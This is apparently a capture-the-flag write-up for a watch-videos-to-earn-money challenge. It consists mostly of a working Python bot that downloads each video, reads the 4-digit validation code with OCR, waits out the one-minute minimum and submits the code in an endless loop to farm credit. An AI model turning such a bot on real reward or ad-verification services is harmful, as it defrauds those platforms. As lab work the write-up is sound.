```

Ce super site permet de devenir riche en regardant des vidéos !

Comme toutes les bonnes choses, il doit bien y avoir un moyen d'en abuser...

```

I :
- Downloaded videos
- Used OCR to identify the code
- Waited at least 1 minute
- Sent validation code

Here is the code i used:

```python
import requests
from bs4 import BeautifulSoup
import cv2
import os
import pytesseract
import numpy as np
import time
import multiprocessing
import datetime

# Hardcoded URL and token
url = "http://infinitemoneyglitch.chall.malicecyber.com"
token = "XXX"


def get_video_id():
    # Make a GET request to the "/video" page
    video_page_url = f"{url}/video"
    headers = {
        'Cookie': f'token={token}'
    }
    response = requests.get(video_page_url, headers=headers)

    # Check if the response status code is 200 (OK)
    if response.status_code == 200:
        # Parse the HTML to extract the video ID
        soup = BeautifulSoup(response.text, 'html.parser')
        video_tag = soup.find('video', {'id': 'video'})
        if video_tag:
            # Extract the video ID from the source attribute
            source_tag = video_tag.find('source')
            if source_tag:
                video_src = source_tag.get('src', '')
                video_id = video_src.split('/')[-1]
                return video_id
        else:
            # Print the HTML content for debugging
            print("Error: Video tag not found in the HTML.")
            print(response.text)
    else:
        print(f"Error: Unable to fetch video page. Status code: {response.status_code}")

def download_video():

    # Get the video ID from the "/video" page
    video_id = get_video_id()

    if video_id:
        # Construct the complete URL with the extracted video_id
        full_url = f"{url}/stream/{video_id}"

        # Define the headers with the Cookie containing the token
        headers = {
            'Cookie': f'token={token}'
        }

        # Make a GET request to the server with the headers
        response = requests.get(full_url, headers=headers, stream=True)

        # Check if the response status code is 200 or 206
        if response.status_code == 200 or response.status_code == 206:
            # Open a file to write the video content
            with open(f"./videos/{video_id}.mp4", 'wb') as video_file:
                # Iterate through the content and write it to the file
                for chunk in response.iter_content(chunk_size=1024):
                    if chunk:
                        video_file.write(chunk)
            print(f"Video {video_id} downloaded successfully.")
            return video_id
        else:
            # Print the HTML content for debugging
            print(f"Error: Unable to download video {video_id}. Status code: {response.status_code}")
            print(response.text)

# Function to extract text from an image using OCR
def extract_text(image):
    return pytesseract.image_to_string(image, config='--psm 8')


# Function to extract text from an image using OCR with additional pre-processing
def extract_text_advanced(image, frame_index, debug_output_folder="debug_frames"):
    # Make a copy of the original image for debugging
    original_image = image.copy()

    # Convert the image to grayscale
    gray_image = cv2.cvtColor(original_image, cv2.COLOR_BGR2GRAY)

    # Apply adaptive thresholding to enhance text visibility
    _, thresholded_image = cv2.threshold(gray_image, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)

    # Convert the thresholded image to np.uint8 data type
    thresholded_image = np.uint8(thresholded_image)

    # Save the thresholded image for debugging
    thresholded_path = os.path.join(debug_output_folder, f"thresholded_frame_{frame_index}.jpg")
    cv2.imwrite(thresholded_path, thresholded_image)

    # Use OCR with enhanced pre-processed image
    extracted_text = pytesseract.image_to_string(thresholded_image, config='--psm 6 -c tessedit_char_whitelist=0123456789')
    return extracted_text

import requests

def send_validation_request(uuid, code):
    # Define the API endpoint
    url = "http://infinitemoneyglitch.chall.malicecyber.com/validate"  # Replace with the actual URL

    # Prepare the JSON data
    json_data = {
        "uuid": uuid,
        "code": code
    }


    headers = {
        'Cookie': f'token={token}'
    }

    # Send the POST request
    try:
        response = requests.post(url,  headers=headers, json=json_data)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            print("Validation request sent successfully.")
            # You can return or process the response content if needed
            return response.json()  # Assuming the response is in JSON format
        else:
            print(f"Error sending validation request. Status code: {response.status_code}")
            print(response.content)
            # You can raise an exception or handle the error accordingly
            # For example, raise Exception("Validation request failed.")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        # Handle request exception (e.g., connection error)


# Function to process the video and extract the 4-character code
def process_video(video_path, num_frames_to_check=10, resize_factor=0.5, debug_output_folder="debug_frames"):
    print(f"Processing {num_frames_to_check} frames in the video...")

    # Create a folder for debug frames if it doesn't exist
    os.makedirs(debug_output_folder, exist_ok=True)

    # Open the video file
    cap = cv2.VideoCapture(video_path)

    # Get video properties
    total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))

    # Determine the step size to evenly sample frames
    step_size = max(total_frames // num_frames_to_check, 1)

    # Loop through a subset of video frames
    for i in range(0, total_frames, step_size):
        # Set the video capture to the desired frame
        cap.set(cv2.CAP_PROP_POS_FRAMES, i)

        # Read the current frame
        ret, frame = cap.read()

        # Break the loop if the video is finished
        if not ret:
            break

        # Resize the frame
        frame_resized = cv2.resize(frame, None, fx=resize_factor, fy=resize_factor)

        # Save the original frame to a file for debugging
        original_frame_path = os.path.join(debug_output_folder, f"original_frame_{i}.jpg")
        cv2.imwrite(original_frame_path, frame_resized)

        # Convert the frame to grayscale for better OCR performance
        gray_frame = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2GRAY)

        # Apply histogram equalization for contrast enhancement
        equalized_frame = cv2.equalizeHist(gray_frame)

        # Save the frame after histogram equalization for debugging
        equalized_path = os.path.join(debug_output_folder, f"equalized_frame_{i}.jpg")
        cv2.imwrite(equalized_path, equalized_frame)

        # Apply inverse binary thresholding
        _, thresholded_frame = cv2.threshold(equalized_frame, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

        # Save the thresholded frame for debugging
        thresholded_path = os.path.join(debug_output_folder, f"thresholded_frame_{i}.jpg")
        cv2.imwrite(thresholded_path, thresholded_frame)

        # Perform OCR on the adaptive thresholded frame using advanced extraction function
        code = extract_text_advanced(frame_resized, i)

        # Print the extracted text for debugging
        #print(f"Extracted text in frame {i}: {code}")

# Check if the extracted text contains 4 numeric characters
        for line in code.split('\n'):
            line = line.strip()
            if line.isdigit() and len(line) == 4:
                print(f"Found code: {line} in frame {i}")
                cap.release()
                return line
        # Print progress
        #print(f"Processed frame {i} of {total_frames} frames.")
    

    # Release the video capture object
    cap.release()

    print(f"Video processing of {num_frames_to_check} frames complete.")
    return 0


ready_to_send=[]

def process_video_and_send_request():
    video_id = download_video()
    # Specify the path to your video file
    video_path = './videos/' + str(video_id) + ".mp4"
    code = process_video(video_path)

    ready_to_send.append([datetime.datetime.now(), video_id, code])


if __name__ == "__main__":
    while(True):
        for i in range (10):
            process_video_and_send_request()


        reminder_to_send = []
        for elem in ready_to_send:
            if (datetime.datetime.now() - datetime.timedelta(minutes = 1) > elem[0]):
                send_validation_request(elem[1], elem[2])
            else:
                reminder_to_send.append(elem)

        ready_to_send = reminder_to_send

```
